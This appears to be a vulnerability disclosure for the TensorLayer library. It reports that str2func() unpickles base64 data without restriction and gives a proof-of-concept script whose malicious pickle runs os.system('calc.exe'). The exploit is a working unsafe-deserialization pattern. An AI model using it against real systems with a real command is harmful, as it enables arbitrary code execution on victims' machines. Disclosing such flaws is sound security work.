## :writing_hand: Description

`TensorLayer` is a novel TensorFlow-based deep learning and reinforcement learning library designed for researchers and engineers. It provides an extensive collection of customizable neural layers to build advanced AI models quickly. This package is vulnerable to `Arbitrary Code Execution`.

## :bug: Vulnerability

`str2func()` function unpickles data encoded in base64. Lack of restriction allowes unpickling of malicious data.

## :male_detective: Proof of Concept

#### Installation
```bash
pip install tensorflow
pip install tensorlayer
```

#### Run exploit.py
```python
import pickle
import os
from base64 import b64encode
from tensorlayer.files.utils import str2func

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

str2func(b64encode(pickle.dumps(EvilPickle())))
```
